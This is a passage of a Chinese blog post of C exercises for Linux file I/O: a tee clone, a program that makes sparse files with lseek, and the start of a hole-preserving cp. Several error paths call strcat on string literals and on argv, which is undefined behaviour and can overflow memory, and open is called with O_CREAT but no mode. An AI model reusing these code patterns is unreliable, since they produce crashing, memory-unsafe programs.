<span class="comment">//防止写入脏数据，但是write时有readSize限制，所以没必要</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; fileCount; i++) &#123;</span><br><span class="line">        errno = <span class="number">0</span>;</span><br><span class="line">        <span class="type">ssize_t</span> writeSize = write(fds[i], readBuffer, readSize);</span><br><span class="line">        <span class="keyword">if</span>(writeSize == <span class="number">-1</span>) &#123; <span class="comment">//先判断-1</span></span><br><span class="line">            exitErr(<span class="built_in">strcat</span>(<span class="string">&quot;file write failed on file: &quot;</span>, files[i]), FILE_WRITE_FAIL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(writeSize &lt; readSize) &#123; <span class="comment">// 部分写</span></span><br><span class="line">            exitErr(<span class="built_in">strcat</span>(<span class="string">&quot;Partial write occured on file: &quot;</span>, files[i]), PARTIAL_WRITE_OCCURED);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>循环读取文件，利用系统调用<code>read</code>，若其返回0，则是遇到<code>eof</code>，跳出循环，若返回<code>-1</code>，则读取错误，异常退出</li><li>读取时注意该系统调用不认为读取的文件一定是文本文件，不会将其处理成字符串，即在末尾添加<code>&#39;\0&#39;</code>，需要手动添加</li><li>从stdin读取后，一次写入待写入的文件中，并判断是否成功，是否发生部分写</li></ul><h3 id="收尾"><a href="#收尾" class="headerlink" title="收尾"></a>收尾</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">release();</span><br></pre></td></tr></table></figure><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;errno.h&gt;</span> <span class="comment">// 使用变量errno</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bool char</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> false 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> true 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> strcmp(a,b) strcmp(a,b)==0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// exit code</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNSUPPORTED_ARG 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_OPEN_FAIL 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STDOUT_WRITE_FAIL 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STDERR_WRITE_FAIL 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STDIN_READ_FAIL 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PARTIAL_WRITE_OCCURED 6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_CLOSE_FAIL 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_WRITE_FAIL 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">printHelp</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">printVersion</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">writeErr</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">writeStdout</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">exitErr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * err, <span class="type">int</span> exitcode)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">release</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 常量</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_FILE_COUNT 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ_BUFFER_SIZE 100</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> **files = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> *fds = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> fileCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="comment">// 参数处理结果</span></span><br><span class="line">    <span class="type">bool</span> append = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">bool</span> ignore_int = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存文件名，打开文件的fd，文件总数</span></span><br><span class="line">    files = (<span class="type">char</span> **)<span class="built_in">malloc</span>(MAX_FILE_COUNT*<span class="keyword">sizeof</span>(<span class="type">char</span> *));</span><br><span class="line">    fds = (<span class="type">int</span> *)<span class="built_in">malloc</span>(MAX_FILE_COUNT*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    fileCount = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 处理参数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; argc; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(argv[i][<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-a&quot;</span>)) &#123;</span><br><span class="line">                append = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-i&quot;</span>) || <span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--ignore-interrupts&quot;</span>)) &#123;</span><br><span class="line">                ignore_int = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-ai&quot;</span>) || <span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-ia&quot;</span>) ) &#123;</span><br><span class="line">                append = <span class="literal">true</span>;</span><br><span class="line">                ignore_int = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--help&quot;</span>)) &#123;</span><br><span class="line">                printHelp();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--version&quot;</span>)) &#123;</span><br><span class="line">                printVersion();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                writeErr(<span class="string">&quot;Unsupported arg: &quot;</span>);</span><br><span class="line">                writeErr(argv[i]);</span><br><span class="line">                writeErr(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                <span class="built_in">free</span>(files);</span><br><span class="line">                <span class="built_in">free</span>(fds);</span><br><span class="line">                <span class="built_in">exit</span>(UNSUPPORTED_ARG);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(fileCount &lt; MAX_FILE_COUNT<span class="number">-1</span>) files[fileCount++] = argv[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开文件，保存fd</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; fileCount; i++) &#123;</span><br><span class="line">        fds[i] = open(files[i], O_CREAT | O_WRONLY | (append == <span class="literal">true</span> ? O_APPEND : O_TRUNC));</span><br><span class="line">        <span class="keyword">if</span>(fds[i] == <span class="number">-1</span>) &#123;</span><br><span class="line">            exitErr(<span class="built_in">strcat</span>(<span class="string">&quot;Can not open file: &quot;</span>, argv[i]), FILE_OPEN_FAIL);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 读取stdin</span></span><br><span class="line">    <span class="type">ssize_t</span> readSize = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> readBuffer[READ_BUFFER_SIZE+<span class="number">1</span>]; <span class="comment">// 需要手动添加&#x27;\0&#x27;， 故+1</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        errno = <span class="number">0</span>;</span><br><span class="line">        readSize = read(STDIN_FILENO, readBuffer, READ_BUFFER_SIZE);</span><br><span class="line">        <span class="keyword">if</span>(readSize == <span class="number">-1</span>) &#123;</span><br><span class="line">            exitErr(<span class="string">&quot;read stdin fail&quot;</span>, STDIN_READ_FAIL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(readSize == <span class="number">0</span>) &#123; <span class="comment">//EOF</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        readBuffer[readSize] = <span class="string">&#x27;\0&#x27;</span>; <span class="comment">//防止写入脏数据，但是write时有readSize限制，所以没必要</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; fileCount; i++) &#123;</span><br><span class="line">            errno = <span class="number">0</span>;</span><br><span class="line">            <span class="type">ssize_t</span> writeSize = write(fds[i], readBuffer, readSize);</span><br><span class="line">            <span class="keyword">if</span>(writeSize == <span class="number">-1</span>) &#123; <span class="comment">//先判断-1</span></span><br><span class="line">                exitErr(<span class="built_in">strcat</span>(<span class="string">&quot;file write failed on file: &quot;</span>, files[i]), FILE_WRITE_FAIL);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(writeSize &lt; readSize) &#123; <span class="comment">// 部分写</span></span><br><span class="line">                exitErr(<span class="built_in">strcat</span>(<span class="string">&quot;Partial write occured on file: &quot;</span>, files[i]), PARTIAL_WRITE_OCCURED);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    release();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">release</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 关闭文件</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; fileCount; i++) &#123;</span><br><span class="line">        errno = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> success = close(fds[i]);</span><br><span class="line">        <span class="keyword">if</span>(success == <span class="number">-1</span>) &#123;</span><br><span class="line">            exitErr(<span class="built_in">strcat</span>(<span class="string">&quot;can not close file: &quot;</span>, files[i]), FILE_CLOSE_FAIL);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(files);</span><br><span class="line">    <span class="built_in">free</span>(fds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printHelp</span><span class="params">()</span> &#123;</span><br><span class="line">    writeStdout(<span class="string">&quot;Usage: tee [-ai][--help][--version][files...]\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">printVersion</span><span class="params">()</span> &#123;</span><br><span class="line">    writeStdout(<span class="string">&quot;Written by Jingtian Meow\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exitErr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * err, <span class="type">int</span> exitcode)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *errstr = strerror(errno);</span><br><span class="line">    writeErr(<span class="string">&quot;Error: &quot;</span>);</span><br><span class="line">    writeErr(errstr);</span><br><span class="line">    writeErr(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    writeErr(err);</span><br><span class="line">    writeErr(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    release();</span><br><span class="line">    <span class="built_in">exit</span>(exitcode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">writeStdout</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span> &#123;</span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> writeSize = write(STDOUT_FILENO, str, <span class="built_in">strlen</span>(str));</span><br><span class="line">    <span class="keyword">if</span>(writeSize == <span class="number">-1</span>) &#123;</span><br><span class="line">        exitErr(<span class="string">&quot;fail to write to stdout\n&quot;</span>, STDOUT_WRITE_FAIL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">writeErr</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span> &#123;</span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> writeSize = write(STDERR_FILENO, str, <span class="built_in">strlen</span>(str));</span><br><span class="line">    <span class="keyword">if</span>(writeSize == <span class="number">-1</span>) &#123;</span><br><span class="line">        release();</span><br><span class="line">        <span class="built_in">exit</span>(STDERR_WRITE_FAIL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实现cp"><a href="#实现cp" class="headerlink" title="实现cp"></a>实现cp</h2><blockquote><p>编写一个类似于cp命令的程序，当使用该程序复制一个包含空洞(连续的空字节)的普通文件时，要求目标文件的空洞与源文件保持一致。</p></blockquote><ul><li>这道题走了一点弯路，一直在探索如何保存文件空洞，不能和上面程序一样<ul><li>由于空洞是程序在文件结尾处<code>lseek</code>了一段大于磁盘<code>blocksize</code>的距离后继续写入造成的，那么需要与其进行相同的<code>lseek</code>操作</li><li>如果读取出的内容全部为0，则记录全为0的长度，直到读取出不全为0的时候，先<code>lseek</code>，再写入</li><li>需要保证buffer的大小小于blocksize</li></ul></li></ul><h3 id="创建文件空洞"><a href="#创建文件空洞" class="headerlink" title="创建文件空洞"></a>创建文件空洞</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLOCKSIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">writeContent</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">char</span> * content)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd = argc &gt;= <span class="number">2</span> ? open(argv[<span class="number">1</span>], O_WRONLY | O_CREAT) : STDOUT_FILENO;</span><br><span class="line">    <span class="type">int</span> fd1 = argc &gt;= <span class="number">2</span> ? open(<span class="built_in">strcat</span>(argv[<span class="number">1</span>],<span class="string">&quot;.normal&quot;</span>), O_WRONLY | O_CREAT) : STDOUT_FILENO;</span><br><span class="line">    <span class="type">int</span> holeNum = argc == <span class="number">3</span> ? atoi(argv[<span class="number">2</span>]) : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> *content;</span><br><span class="line">    <span class="type">char</span> blank[BLOCKSIZE*<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memset</span>(blank, <span class="string">&#x27; &#x27;</span>, <span class="keyword">sizeof</span>(blank));</span><br><span class="line">    blank[BLOCKSIZE*<span class="number">2</span><span class="number">-1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; holeNum; i++) &#123;</span><br><span class="line">        content = <span class="string">&quot;Content before the file hole!!!!!\n&quot;</span>;</span><br><span class="line">        writeContent(fd, content);</span><br><span class="line">        writeContent(fd1, content);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// make a hole</span></span><br><span class="line">        lseek(fd, BLOCKSIZE*<span class="number">2</span>, SEEK_CUR);</span><br><span class="line">        writeContent(fd1, blank);</span><br><span class="line"></span><br><span class="line">        content = <span class="string">&quot;Content after the file hole!!!!!\n&quot;</span>;</span><br><span class="line">        writeContent(fd, content);</span><br><span class="line">        writeContent(fd1, content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(close(fd) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(close(fd1) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">writeContent</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">char</span> * content)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> contentLen = <span class="built_in">strlen</span>(content) + <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> writeSize = write(fd, content, contentLen);</span><br><span class="line">    <span class="keyword">if</span>(writeSize == <span class="number">-1</span> || writeSize &lt; contentLen) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>打开两个文件用作对比，fd通过lseek制造空洞，fd1写入相同大小的空格</li></ul><h3 id="使用命令stat比较生成的两个文件"><a href="#使用命令stat比较生成的两个文件" class="headerlink" title="使用命令stat比较生成的两个文件"></a>使用命令<code>stat</code>比较生成的两个文件</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@tt-surfacepro6:~/linux<span class="comment"># stat -c %b abc</span></span><br><span class="line">16</span><br></pre></td></tr></table></figure><p>abc的块数是16</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@tt-surfacepro6:~/linux<span class="comment"># stat -c %b abc.normal </span></span><br><span class="line">24</span><br></pre></td></tr></table></figure><p>abc.normal的块数的24</p><h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// #define debug</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> debug</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bool char</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> false 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> true 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> strcmp(a,b) strcmp(a,b)==0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// exit code</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNSUPPORTED_ARG 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_OPEN_FAIL 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STDOUT_WRITE_FAIL 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STDERR_WRITE_FAIL 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STDIN_READ_FAIL 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PARTIAL_WRITE_OCCURED 6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_CLOSE_FAIL 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_WRITE_FAIL 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_READ_FAIL 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INVALID_ARG 9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">printHelp</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">printVersion</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">writeErr</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">writeStdout</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fileErrClose</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * filename, <span class="type">const</span> <span class="type">char</span> *err, <span class="type">int</span> exitCode)</span>; </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ_BUFF_SIZE 1023</span></span><br></pre></td></tr></table></figure><h3 id="工具函数-1"><a href="#工具函数-1" class="headerlink" title="工具函数"></a>工具函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span 